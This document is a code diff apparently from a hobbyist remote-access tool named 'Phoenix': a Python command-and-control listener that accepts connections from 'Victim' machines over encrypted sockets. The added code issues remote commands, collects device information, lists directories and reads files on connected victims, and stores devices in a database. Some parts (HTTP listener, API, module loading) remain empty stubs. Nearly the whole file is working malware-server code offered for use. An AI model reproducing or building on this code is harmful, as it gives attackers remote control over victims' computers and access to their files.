@@ -1,24 +1,31 @@
-import socket
-from flask import *
-import os
-import random
-import time
-from pystyle import *
-from rich.progress_bar import ProgressBar
-import threading
-from cryptography.fernet import Fernet, InvalidToken
-from argparse import ArgumentParser
-port = 0000
-mode = "http"
-class CLI():
-    def print_logo(self):
-        print(Colorate.Horizontal(Colors.yellow_to_red, self.logo))
-    def __init__(self):
-        global mode, port
-        self.parser = ArgumentParser()
-        self.parser.add_argument("-p", default=9999, metavar="Port")
-        self.parser.add_argument("-m", default="socket", metavar="Mode", choices=["socket", "http"])
-        self.logo = Add.Add("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+###########################################Imports#########################################
+try:
+    from sqlite3 import connect, OperationalError
+    import socket
+    from flask import *
+    import os
+    from rich.console import Console
+    import time
+    from pystyle import *
+    from rich.progress_bar import ProgressBar
+    import threading
+    from cryptography.fernet import Fernet, InvalidToken
+    from argparse import ArgumentParser
+except ImportError:
+    print("[ERROR] Not all required Modules are installed.")
+    exit()
+############################################Database########################################
+conn = connect("db.sqlite3")
+curr = conn.cursor()
+try:
+    curr.execute("SELECT * FROM Devices")
+    curr.fetchall()
+except:
+    print("[ERROR] Database isnt configured.")
+    exit()
+###########################################Global Vars######################################
+console = Console()
+logo = Add.Add("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⠀⠀⠀⠀⠀⢀⣬⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⠀⠀⠀⠀⣬⣿⣯⣮⣌⣌⣌⢌⢈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⣿⠀⠀⠀⣸⣿⣿⠁⠀⠐⠑⠑⠳⡳⣷⣮⢌⠈⠀⠀⠀⠀⠀⠀⠀⠀
@@ -37,7 +44,7 @@ class CLI():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠱⡳⡷⣷⣿⣿⣯⣮⣾⡿⡷⠳⠓⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 """, f"""
 
-  ▄███████▄    ▄█    █▄     ▄██████▄     ▄████████ ███▄▄▄▄    ▄█  ▀████    ▐████▀ 
+   ▄███████▄    ▄█    █▄     ▄██████▄     ▄████████ ███▄▄▄▄    ▄█  ▀████    ▐████▀ 
   ███    ███   ███    ███   ███    ███   ███    ███ ███▀▀▀██▄ ███    ███▌   ████▀  
   ███    ███   ███    ███   ███    ███   ███    █▀  ███   ███ ███▌    ███  ▐███    
   ███    ███  ▄███▄▄▄▄███▄▄ ███    ███  ▄███▄▄▄     ███   ███ ███▌    ▀███▄███▀    
@@ -46,13 +53,18 @@ class CLI():
   ███          ███    ███   ███    ███   ███    ███ ███   ███ ███   ▄███     ███▄  
  ▄████▀        ███    █▀     ▀██████▀    ██████████  ▀█   █▀  █▀   ████       ███▄
 {Box.DoubleCube("Made by Screamz2k")}""", 4, True)
-        self.print_logo()
-        self.args = self.parser.parse_args()
-        mode = self.args.m
-        port = self.args.p 
+port = 0000
+mode = "http"
+###########################################Functions#######################################
+def log(text, style=None, justify="left"):
+    console.print(text, style=style, justify=justify)
+def ph_print(text):
+    print(Colorate.Horizontal(Colors.yellow_to_red, text))
+###########################################Classes##########################################
 class Socket_Listener():
     def __init__(self, port):
-        self.setup()
+        self.port = port
+        self.setup(port)
     def decrypt(self, data):
         return self.fernet.decrypt(data).decode()
 
@@ -72,13 +84,10 @@ class Socket_Listener():
                     self.connections.remove(conn_i)
             time.sleep(10)
 
-    def check_connections(self):
-        return self.connections
 
     def rce(self, id, cmd):
         """Send a Cmd to Victim and return Output"""
         conn, addr = self.connections[id]
-        cmd = input("CMD: ")
         conn.send(self.encrypt(f"CMD:{cmd}"))
         try:
             output = self.decrypt(conn.recv(1024))
@@ -88,27 +97,57 @@ class Socket_Listener():
             return True, output
 
     def get_device_infos(self, id):
-        """Send Commands to get Hostname, Ip, Os, Users, etc."""
+        conn, addr = self.connections[id]
+        conn.send(self.encrypt(f"infos:"))
+        try:
+            output = self.decrypt(conn.recv(1024))
+        except:
+            return False, ""
+        else:
+            return True, output        
+    def load_module(self, id, module):
         pass
-
+    def execute_module(self, id, module):
+        pass
+    def get_directory_contents(self, id, dir):
+        conn, addr = self.connections[id]
+        conn.send(self.encrypt(f"dir:{dir}"))
+        try:
+            output = self.decrypt(conn.recv(1024))
+        except:
+            return False, ""
+        else:
+            return True, output
+    def get_file_contents(self, id, path):
+        conn, addr = self.connections[id]
+        conn.send(self.encrypt(f"content:{path}"))
+        try:
+            output = self.decrypt(conn.recv(1024))
+        except:
+            return False, ""
+        else:
+            return True, output
     def start(self):
         self.server.listen()
         while True:
             conn, addr = self.server.accept()
             self.connections.append((conn, addr))
             conn.send(self.key)
-            conn.sendfile
+            ph_print("[SUCCESS] New Connection initialised.")
 
-    def setup(self):
+    def setup(self, port):
         self.connections = []
         self.key = Fernet.generate_key()
         self.fernet = Fernet(self.key)
-        PORT = 1234
         SERVER = socket.gethostbyname(socket.gethostname())
-        ADDR = (SERVER, PORT)
+        ADDR = (SERVER, port)
 
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.bind(ADDR)
+        try:
+            self.server.bind(ADDR)
+        except:
+            log("[ERROR] Port is already in use.", style="red")
+            exit()
         threading.Thread(target=self.start).start()
         threading.Thread(target=self.refresh_connections).start()
 
@@ -147,5 +186,21 @@ class Socket_Listener():
 
 class Http_Listener(Flask):
     pass
-
-CLI().print_logo()
+class Api(Flask):
+    pass
+class CLI():
+    pass
+###########################################Main############################################
+if __name__ == "__main__":
+    parser = ArgumentParser()
+    parser.add_argument("-p", default=9999, metavar="Port")
+    parser.add_argument("-m", default="socket", metavar="Mode", choices=["socket", "http"])
+    ph_print(logo)
+    args = parser.parse_args()
+    mode = args.m
+    port = args.p 
+    log(f"[INFO] Using {mode.upper()} Mode.", style="blue")
+    log(f"[INFO] Starting Listener.", style="blue")
+    Server = Socket_Listener(port)
+    log(f"[SUCCESS] Listner started.", style="green")
+    log(f"[INFO] Listening on Port {port}", style="blue")
